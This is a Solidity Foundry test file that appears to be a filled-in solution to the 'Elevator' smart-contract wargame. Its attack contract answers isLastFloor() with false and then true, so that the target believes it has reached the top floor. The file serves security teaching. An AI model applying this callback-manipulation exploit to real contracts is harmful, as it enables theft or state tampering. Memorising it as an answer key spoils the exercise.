// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Elevator, Building} from "../src/Elevator.sol";

/// @dev Elevator trusts this contract to report whether a floor is the last one.
contract AttackElevator is Building {
    Elevator public immutable target;
    bool private calledOnce;

    constructor(Elevator _target) {
        target = _target;
    }

    function attack(uint256 floor) external {
        target.goTo(floor);
    }

    function isLastFloor(uint256) external returns (bool) {
        // ========== YOUR ATTACK LOGIC HERE ==========
        // Elevator calls this function twice during one goTo() call.
        // Return false for the first call and true for the second.
        // `calledOnce` tracks whether we've already answered once.
        if (!calledOnce) {
            calledOnce = true;
            return false;
        }
        return true;
        // ========== END ATTACK LOGIC ==========
    }
}

contract ElevatorTest is Test {
    Elevator public target;
    AttackElevator public attackContract;

    address public deployer = makeAddr("deployer");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        vm.prank(deployer);
        target = new Elevator();

        vm.prank(attacker);
        attackContract = new AttackElevator(target);
    }

    function testExploit() public {
        // Win condition:
        //   target.top() == true
        //
        // Elevator trusts msg.sender's isLastFloor() result and calls it twice.
        // A malicious Building can return a different answer on each call.

        vm.startPrank(attacker);

        // ========== YOUR EXPLOIT HERE ==========
        attackContract.attack(42);
        // ========== END EXPLOIT ==========

        vm.stopPrank();

        assertTrue(target.top(), "elevator should reach the top");
    }
}
